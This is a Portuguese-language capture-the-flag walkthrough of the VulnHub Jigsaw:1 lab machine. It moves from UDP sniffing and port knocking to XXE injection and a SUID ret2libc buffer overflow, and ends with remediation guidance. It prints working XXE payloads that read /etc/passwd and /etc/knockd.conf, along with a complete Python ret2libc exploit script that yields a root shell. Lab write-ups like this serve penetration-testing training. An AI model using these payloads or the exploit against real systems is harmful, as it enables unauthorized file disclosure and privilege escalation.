# VulnHub Jigsaw:1 — Eu Quero Brincar de um Jogo

Apresento hoje mais um excelente desafio no estilo boot2root CTF, e pode acreditar: este aqui tem o tempero mais pesado que já vi em muito tempo. Buffer Overflow, Port Knocking, XXE e leet speak, tudo em uma única máquina. ¯\_(ツ)_/¯

Desta vez trago mais uma máquina do autor Zayotic, e para aqueles que já têm alguma prática em suas VMs, saibam que esta é mais uma de nível Hard to Insane. (ノಠ ∩ಠ)ノ彡

A VM Jigsaw:1 está disponível no VulnHub para fins de exploração e práticas de pentest. Pertence à série de máquinas Jigsaw.

Para download e mais informações: https://www.vulnhub.com/entry/jigsaw-1,228/

---

| Campo | Valor |
|-------|-------|
| **Nível** | Hard to Insane |
| **VM Alvo** | Jigsaw:1 |
| **VM Atacante** | Kali Linux 2019.2 |
| **VulnHub** | https://www.vulnhub.com/entry/jigsaw-1,228/ |
| **Técnicas** | Sniffing ARP/UDP, port knocking, injeção XXE, SSH com leet speak, SUID BoF ret2libc |
| **CVEs** | CWE-611 (XXE), CWE-121 (Stack-based Buffer Overflow) |

> **Dicas do autor:**
> "Recomendamos usar VirtualBox no lugar de VMware para esta VM."
> "Note: verifique pacotes ARP em vez de fazer port scans."

---

## Resumo do Ataque

```
[host-discovery: arp-scan]
    |
    v
[network sniffing: tcpdump UDP porta 666 -> dica leet speak + flag1]
    |
    v
[port knocking: 5500 6600 7700 -> porta 80 abre]
    |
    v
[enumeração HTTP: strings no GIF -> caminho de login oculto]
    |
    v
[injeção XXE no formulário XML -> /etc/passwd + /etc/knockd.conf]
    |
    v
[port knocking: 7011 8011 9011 -> SSH porta 22 abre]
    |
    v
[SSH login: jigsaw:j19s4w (leet speak)]
    |
    v
[flag2 em ~/flag.txt]
    |
    v
[binário SUID /bin/game3 -> ELF 32-bit ret2libc BoF]
    |
    v
[shell ROOT]
```

---

## Metodologia

1. Host discovery no segmento de rede local
2. Network sniffing (a dica do autor: ARP é distração, precisa ir mais fundo)
3. Decode da mensagem UDP: base64 revela o segredo
4. Port knocking para desbloquear a porta 80
5. Enumeração web e esteganografia no arquivo GIF
6. Injeção XXE no formulário de login XML
7. Segunda sequência de port knocking para desbloquear SSH
8. Login SSH com credencial em leet speak
9. Exploração binária: ret2libc contra o binário ELF32 com SUID

---

## Etapa 1: Identificando o Alvo na Rede

A dica do autor é clara, mano: não comece com port scan padrão. "Check for ARP rather than port scans" é um aviso para olhar o tráfego de camada 2 primeiro. Utilizamos o `arp-scan` para encontrar o alvo na sub-rede local.

```bash
# Identifica o gateway e a sub-rede atual
route -n

# Encontra hosts ativos via ARP
arp-scan --ignoredups --localnet
# Alternativas: nmap -sn -T5 192.168.0.0/24
# Ou: netdiscover -r 192.168.0.0/24
```

Saída esperada:

```
192.168.0.6    08:00:27:xx:xx:xx    (VirtualBox)
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Etapa 2: Network Sniffing — Lendo o Broadcast

> **O que é network sniffing aqui?**
> A VM alvo está enviando mensagens em broadcasts UDP em portas não padrão. Sem capturar o tráfego, jamais saberemos que a porta existe. Esta é uma técnica real: beacons de C2, hosts de pivot e dispositivos embarcados frequentemente se comunicam em portas não-HTTP/S que scans TCP padrão ignoram completamente.

Primeira tentativa filtrando só ARP: traz apenas handshakes padrão, nada útil. O truque é inverter o filtro: capturar tudo do host, exceto ARP.

```bash
# Primeira tentativa: filtra só ARP (não traz nada útil)
tcpdump -i eth1 -A -n host 192.168.0.6 and arp

# A jogada real: excluir ARP para capturar o broadcast UDP
tcpdump -i eth1 -A -n host 192.168.0.6 and not arp
# -i eth1: seleciona a interface de rede (confirme com 'ip link')
# -A: exibe em ASCII para ler strings embutidas
# -n: não resolve DNS (mais rápido, menos ruído)
# and not arp: ignora tráfego ARP e captura todo o resto
```

Saída esperada (após alguns segundos aguardando o broadcast):

```
Tráfego UDP porta 666:
j19s4w was always fascinated with l33t speak, in fact he uses it for a lot of his passwords
```

Também tem uma mensagem codificada em base64 nesta porta. Conecte com netcat UDP e envie a palavra-gatilho:

```bash
# Disparar a mensagem secreta
python -c "print 'j19s4w'" | nc -u 192.168.0.6 666 -q1 | base64 -d
```

Saída esperada:

```
flag1{3034cc2927b59e0b20696241f14d573e}
You completed your first test.
Now knock these numbers to find what you seek. 5500 6600 7700
```

Bingo!! ( ˘ ³˘)♥ flag1 capturada e a próxima sequência está bem ali.

Ixi, que máquina inteligente essa! O autor não jogou fácil não.

> **Nota do mundo real:** Movimento lateral e beaconing de C2 em portas UDP incomuns é uma técnica documentada do grupo FIN7. O implante CARBANAK deles usava canais UDP customizados para evitar detecção por IDS baseado em assinaturas.

> **MITRE ATT&CK:** [T1040 Network Sniffing] [T1571 Non-Standard Port]

---

## Etapa 3: Port Knocking — Desbloqueando o Serviço Web

> **O que é port knocking?**
> Port knocking é um mecanismo de segurança onde o firewall mantém uma porta fechada até que uma sequência específica de tentativas de conexão em outras portas seja feita na ordem correta. É usado para esconder serviços SSH ou administrativos de scanners automatizados. Quem encontra a sequência desbloqueia o serviço silenciosamente.

Obtemos a sequência do broadcast UDP: `5500 6600 7700`. Um loop simples com nmap resolve.

```bash
# Bater na sequência para desbloquear a porta 80
for knock in 5500 6600 7700; do
    nmap -Pn --host-timeout 201 --max-retries 0 -p $knock 192.168.0.6
done

# Também funciona com o cliente knockd se instalado:
# knock 192.168.0.6 5500 6600 7700

# Agora escanear as portas abertas
nmap -A -T4 -p- 192.168.0.6
```

Saída esperada após o knock:

```
80/tcp  open  http    Apache httpd 2.x
```

Porta 80 ativa. ¯\_(ツ)_/¯ O firewall estava escondendo ela o tempo todo.

> **MITRE ATT&CK:** [T1205.001 Traffic Signaling: Port Knocking] [T1046 Network Service Discovery]

---

## Etapa 4: Enumeração Web e Esteganografia no GIF

O diretório raiz web exibe apenas uma imagem do personagem Jigsaw. O `robots.txt` retorna 404. Brute-force de diretórios com wordlists comuns não retorna nada. Isso é uma dica forte para olhar para os próprios assets em vez de caminhos de URL.

```bash
# Baixar o GIF do código-fonte da página
wget http://192.168.0.6/jigsaw.gif

# Verificar tipo de arquivo
file jigsaw.gif

# Extrair strings embutidas (verificação básica de esteganografia)
strings jigsaw.gif
```

Saída esperada (últimas linhas do `strings`):

```
/SeekAndYouShallFind
```

Esse caminho existe no servidor web. Acessar `http://192.168.0.6/SeekAndYouShallFind` revela um formulário de login que envia XML via POST. Caramba, o XML já deixa a coisa suspeita neste ponto. ( ͡° ͜ʖ ͡°)

O código-fonte da página também traz este comentário:

```html
<!-- When you are in hell, only your mind can help you out. Test #2 will soon arrive. -->
```

> **Nota do mundo real:** Dados ocultos em imagens é uma técnica conhecida de exfiltração. O grupo APT41 (Winnti Group) foi documentado usando esteganografia em PNG e GIF para esconder configurações de C2.

> **MITRE ATT&CK:** [T1027.003 Obfuscated Files: Steganography] [T1083 File and Directory Discovery]

---

## Etapa 5: Injeção XXE — Lendo Arquivos Internos do Servidor

> **O que é injeção XXE?**
> XML External Entity (XXE) injection acontece quando um parser XML processa input fornecido pelo usuário que referencia uma entidade externa. Um atacante pode usar isso para ler arquivos locais, realizar SSRF ou, em algumas configurações, obter execução remota de código. É a CWE-611 e aparece no OWASP Top 10 (A05:2021, Security Misconfiguration).
> Referência: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

Intercepte o POST de login com o Burp Suite (ou use curl). O corpo da requisição parece com:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <email>meu_email</email>
  <password>minha_senha</password>
</root>
```

Payload XXE clássico para ler `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ELEMENT test ANY > <!ENTITY meu_email SYSTEM "file:///etc/passwd" >]>
<root>
  <email>&meu_email;</email>
  <password></password>
</root>
```

```bash
# Enviar o payload XXE via curl
curl -s -X POST http://192.168.0.6/SeekAndYouShallFind/login.php \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ELEMENT test ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><root><email>&xxe;</email><password></password></root>'
```

A resposta vaza o `/etc/passwd`, confirmando que o usuário `jigsaw` existe no sistema. (☞ﾟヮﾟ)☞

Agora ler o arquivo de configuração do knockd para obter a sequência de desbloqueio do SSH:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ELEMENT test ANY > <!ENTITY meu_email SYSTEM "file:///etc/knockd.conf" >]>
<root>
  <email>&meu_email;</email>
  <password></password>
</root>
```

Saída esperada do `/etc/knockd.conf`:

```
[openSSH]
    sequence    = 7011,8011,9011
    seq_timeout = 5
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
```

Wow guys!! Bingo!! Temos a sequência para desbloquear o SSH. |o|

> **Nota do mundo real:** Vulnerabilidades XXE foram usadas em breaches sérios. A principal diferença entre um CTF e o mundo real é a escala: em uma empresa brasileira, um ERP legado ou sistema de NF-e integrando XML de parceiros sem sanitização pode expor credenciais de banco de dados, chaves de API e configurações internas de rede. O ataque é o mesmo; o impacto é devastador.

> **MITRE ATT&CK:** [T1190 Exploit Public-Facing Application] [T1083 File and Directory Discovery]

---

## Etapa 6: Acesso SSH via Credencial em Leet Speak

Primeiro knockear a sequência SSH:

```bash
# Desbloquear a porta 22
knock 192.168.0.6 7011 8011 9011
# Ou com nmap:
for knock in 7011 8011 9011; do
    nmap -Pn --host-timeout 201 --max-retries 0 -p $knock 192.168.0.6
done

# Confirmar que o SSH está aberto
nmap -A -T5 -p22 192.168.0.6
```

A mensagem UDP dizia: `j19s4w was always fascinated with l33t speak, in fact he uses it for a lot of his passwords`. O usuário é `jigsaw`. Em leet speak, `jigsaw` vira `j19s4w`. Essa é a senha. Simples assim, mano.

```bash
ssh jigsaw@192.168.0.6
# Senha: j19s4w
```

Após o login, você vê:

```
=> There are 2 zombie processes
```

Coisa interessante, mas o útil está no diretório home:

```bash
ls -la ~
cat ~/flag.txt
```

```
flag2{<valor>}
Hack or fail. Make your choice... Now comes your final test.
```

Maravilha pessoal!! Conseguimos a flag2!! ;)

Infelizmente, como nem tudo são flores ლ(ಠ_ಠლ), parece que este não é o final. A mensagem já avisa: vem mais coisa por aí.

> **MITRE ATT&CK:** [T1021.004 Remote Services: SSH] [T1078 Valid Accounts]

---

## Etapa 7: Descoberta do Binário SUID

```bash
# Buscar binários SUID
find / -perm -u=s -type f 2>/dev/null

# Verificar privilégios SUDO
sudo -l
```

Saída esperada do `find`:

```
/bin/game3
```

```bash
file /bin/game3
```

```
/bin/game3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked (uses shared libs), for GNU/Linux 2.6.24,
BuildID[sha1]=affd50502e973bd3d6d0637028395d87ba695ab9, not stripped
```

Fatos importantes: SUID ativo (executa como root), 32-bit, ligado dinamicamente à libc (atacável via ret2libc), not stripped (símbolos presentes para debugging). Tudo indica ret2libc. ( ͡° ͜ʖ ͡°)

Testando o buffer overflow manualmente:

```bash
/bin/game3 $(python -c "print 'A'*100")
# Segmentation fault
/bin/game3 $(python -c "print 'A'*50")
# Saída normal
```

Confirmado: há um overflow entre 50 e 100 bytes.

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Setuid and Setgid]

---

## Etapa 8: Buffer Overflow — Exploit Ret2Libc

> **O que é um ataque ret2libc?**
> Return-to-libc é uma técnica de buffer overflow onde, ao invés de injetar shellcode, o atacante sobrescreve o endereço de retorno salvo na pilha para apontar para uma função já carregada na memória, tipicamente `system()` da libc. O argumento `/bin/sh` também é extraído da tabela de strings da libc. Isso contorna proteções de pilha não executável (NX/DEP) completamente.
> Referência: https://en.wikipedia.org/wiki/Return-to-libc_attack

Copiar o binário para a máquina atacante para debugging:

```bash
# Na máquina atacante
scp jigsaw@192.168.0.6:/bin/game3 /tmp/game3
```

Usar `gdb-peda` para encontrar o offset exato:

```bash
gdb /tmp/game3

# Gerar padrão cíclico de 200 caracteres
gdb-peda$ pattern_create 200

# Executar com o padrão como argumento
gdb-peda$ run <colar_padrão_aqui>

# EIP capturado no crash:
# EIP: 0x41344141 ('AA4A')

# Encontrar o offset
gdb-peda$ pattern_offset AA4A
# Resultado: 76
```

O buffer tem 76 bytes. Agora coletar os endereços da libc na máquina alvo (não na atacante, pois ASLR difere):

```bash
# Na máquina alvo (sessão SSH como jigsaw)
ldd /bin/game3 | grep libc
# libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb755f000)

readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system"
# Offset: 0x00040310

readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " exit"
# Offset: 0x00033260

strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
# Offset: 0x00162d4c
```

Criar o exploit em `/tmp` na máquina alvo:

```python
# /tmp/xpl.py
from subprocess import call
import struct

base_addr  = 0xb755f000
sys_addr   = struct.pack("<I", base_addr + 0x00040310)
exit_addr  = struct.pack("<I", base_addr + 0x00033260)
shell_addr = struct.pack("<I", base_addr + 0x00162d4c)

buf  = "A" * 76
buf += sys_addr
buf += exit_addr
buf += shell_addr

i = 0
while i < 512:
    i += 1
    ret = call(["/bin/game3", buf])
```

```bash
# Executar o exploit na máquina alvo
cd /tmp
python xpl.py
```

Aguarde alguns segundos para o loop acertar o alinhamento da pilha. Quando disparar:

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

(╯°□°）╯︵ ┻━┻ WOW GUYS!! Mais um sistema Owned!! ;)

Confesso que exploração binária ainda é uma área em constante evolução para mim, huahuahua. Mas a sensação de ver o `whoami` retornar `root` depois de um ret2libc bem construído não tem preço.

> **Nota do mundo real:** A técnica ret2libc é a base dos ataques modernos de ROP (Return-Oriented Programming). O CVE-2021-4034 (PwnKit), que afetou praticamente todas as distribuições Linux por mais de 12 anos, usa um primitivo quase idêntico contra o binário SUID `pkexec`. Está no catálogo CISA KEV.

> **MITRE ATT&CK:** [T1068 Exploitation for Privilege Escalation] [T1059.004 Unix Shell]

---

## Etapa 9: Root e Flag

**(☞ﾟヮﾟ)☞ Got root!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

ls /root
cat /root/flag.txt
```

---

## Artefatos Capturados: Flags, Hashes e Credenciais

| Tipo | Valor | Onde Foi Encontrado | Crackado/Usado |
|------|-------|---------------------|----------------|
| Flag 1 | `flag1{3034cc2927b59e0b20696241f14d573e}` | UDP porta 666 (broadcast decodificado em base64) | N/A |
| Flag 2 | `flag2{<valor>}` | `~/flag.txt` após login SSH | N/A |
| Credencial | `jigsaw:j19s4w` | Inferência leet speak da mensagem UDP | Login SSH |
| Sequência knock 1 | `5500 6600 7700` | Mensagem UDP decodificada | Desbloqueia porta 80 |
| Sequência knock 2 | `7011 8011 9011` | XXE leitura de `/etc/knockd.conf` | Desbloqueia porta 22 |
| Offset BoF | `76 bytes` | gdb-peda pattern_offset | Payload ret2libc |
| Base libc | `0xb755f000` | `ldd /bin/game3` na máquina alvo | Payload ret2libc |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|-----------------|
| 1 | Broadcast UDP vazando dicas de configuração | Dispositivos IoT e sistemas legados frequentemente transmitem dados sensíveis na LAN | Sempre capture tráfego de rede completo em engajamentos internos, não apenas TCP |
| 2 | Port knocking como mecanismo de serviço oculto | Alguns servidores legados e roteadores domésticos ainda usam knockd; conhecer a sequência contorna a proteção inteiramente | Port knocking é obscuridade, não segurança; VPN com autenticação por certificado é o caminho certo |
| 3 | Injeção XXE em formulários de login XML | Muitas aplicações enterprise aceitam input XML (SOAP, SAP, REST com XML) sem validação de entidades | Desabilitar processamento de entidades externas em todos os parsers XML; usar DENY ALL como política padrão |
| 4 | Credencial derivada do username em leet speak | Políticas de senha que permitem transformações previsíveis são amplamente exploradas por ferramentas de credential stuffing | Enforçar complexidade de senha que impeça variações baseadas no nome; usar MFA |
| 5 | Binário SUID com buffer overflow na pilha | Qualquer binário SUID com bug de corrupção de memória dá ao atacante um caminho direto para root | Auditar todos os binários SUID; remover SUID de binários que não necessitam disso |
| 6 | Ret2libc contorna NX/DEP | Exploits modernos usam chains ROP construídas no mesmo princípio; aplicável a binários de produção reais | Habilitar ASLR em todo o sistema, compilar com stack canaries e PIE |

**Por que isso importa fora do laboratório?**

Percebemos com este desafio que cada camada de complexidade tem um paralelo direto no mundo real. A técnica ret2libc deste binário é exatamente o primitivo usado no CVE-2021-4034 (PwnKit), que ficou presente em praticamente toda distribuição Linux por mais de 12 anos. No Brasil, empresas que mantêm sistemas ERP legados com interfaces XML sem sanitização correm o risco real de XXE: uma integração com fornecedor que envia XML malicioso pode resultar em leitura de arquivos internos e pivotamento na rede. O FIN7 e o Lazarus Group documentadamente usam canais UDP não-padrão para C2, exatamente como esta máquina simula. Pensar fora da caixa não é só para CTF, tá ligado? É o que diferencia um teste de intrusão que encontra vetores reais de um que apenas roda ferramentas automatizadas.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconhecimento | TA0043 | Network Sniffing | T1040 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application (XXE) | T1190 |
| Acesso Inicial | TA0001 | Valid Accounts (leet-speak credential) | T1078 |
| Execução | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Escalação de Privilégios | TA0004 | Exploitation for Privilege Escalation (ret2libc) | T1068 |
| Escalação de Privilégios | TA0004 | Setuid and Setgid | T1548.001 |
| Evasão de Defesa | TA0005 | Traffic Signaling: Port Knocking | T1205.001 |
| Acesso a Credenciais | TA0006 | Unsecured Credentials (leet-speak no broadcast) | T1552.001 |
| Descoberta | TA0007 | Network Service Discovery | T1046 |
| Descoberta | TA0007 | File and Directory Discovery | T1083 |
| Descoberta | TA0007 | System Information Discovery | T1082 |
| Coleta | TA0009 | Data from Local System (arquivos de flag) | T1005 |

> Referência: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Desabilitar processamento de entidades externas em todos os parsers XML; usar `LIBXML_NOENT` desligado e validar input contra um schema whitelist.
2. Remover o serviço UDP broadcast na porta 666; se necessário para comunicação interna, restringir ao localhost e criptografar o payload.
3. Desabilitar port knocking como único mecanismo de segurança; substituir por VPN adequada (WireGuard, OpenVPN) com autenticação por certificado.
4. Remover o bit SUID de `/bin/game3` e qualquer binário customizado que não exija root estritamente; auditar com `find / -perm -u=s`.
5. Compilar todos os binários SUID com flags de hardening modernas: `-fstack-protector-all`, `-D_FORTIFY_SOURCE=2`, e linkar com `-z relro -z now -pie`.
6. Enforçar política de senhas que rejeite senhas derivadas do nome de usuário; implementar MFA para todo acesso remoto.

### Se Você Encontrar Algo Parecido no Seu Ambiente

**Contenção imediata:**
- Isolar o host da rede se XXE for confirmado; um atacante que leu `/etc/passwd` pode já ter escalado para pivôs internos.
- Rotacionar todas as credenciais SSH no host afetado e auditar arquivos authorized_keys.
- Revisar todos os binários SUID no host: `find / -perm -u=s -type f 2>/dev/null` e comparar com um baseline confiável.

**Contramedidas MITRE D3FEND:**
- D3-IVA (Input Validation) para XXE (T1190)
- D3-MFA (Multi-factor Authentication) para abuso de credencial fraca (T1078)
- D3-OPS (OS Process Sandboxing) para exploração de binário SUID (T1548.001)
- D3-CTS (Credential Transmission Scoping) para leet-speak no broadcast (T1552.001)

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identify (ID.AM): Manter inventário de todos os binários SUID e serviços expostos.
- Protect (PR.AC-4): Implementar gestão de acesso privilegiado; remover bits SUID desnecessários.
- Detect (DE.CM-1): Monitorar tráfego de rede para broadcasts UDP incomuns e atividade em portas não-padrão.
- Respond (RS.RP-1): Executar plano de resposta a incidentes ao detectar exploração XXE.
- Recover (RC.RP-1): Restaurar a partir de backup limpo após rotação de credenciais e hardening.

**NIST SP 800-53 (Rev. 5):**
- SI-10: Validação de Input de Informação (prevenção de XXE)
- CM-7: Funcionalidade Mínima (remover SUID, desabilitar serviços desnecessários)
- IA-5: Gestão de Autenticadores (política de senhas, sem variantes leet-speak)
- AC-6: Menor Privilégio (auditoria de binários SUID)
- SC-8: Confidencialidade de Transmissão (criptografar broadcast UDP ou removê-lo)

**CISA Known Exploited Vulnerabilities:**
- CVE-2021-4034 (pkexec SUID BoF, Polkit): mesma classe que o binário game3. Listado no catálogo CISA KEV.
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2:**
- Domínio: TECHNOLOGY (Configuration Management)
- Prática: Gerenciar configurações de ativos tecnológicos para reduzir superfície de ataque
- Target MIL: MIL-2 (práticas documentadas com processos definidos)

---

## Considerações Finais

Escrever este artigo não foi fácil, pois ainda estou desenvolvendo minhas habilidades em PWN! huahuahua

Muito obrigado ao autor Zayotic por construir uma máquina que ensina de verdade. A progressão do sniffing UDP passando pelo port knocking, chegando ao XXE e depois ao exploit de binário é genuinamente educativa, e o tema Jigsaw mantém a narrativa viva.

Para quem está seguindo trilha OSCP ou eCPPT: esta máquina cobre enumeração de rede, exploração de aplicação web (XXE cai em prova) e fundamentos de exploração binária em um único lab.

Não esqueça: pense fora da caixa!! (•̀ᴗ•́)و

Se este walkthrough te ajudou, compartilha com a galera e segue hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português de André Henrique: https://medium.com/@mrhenrike

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
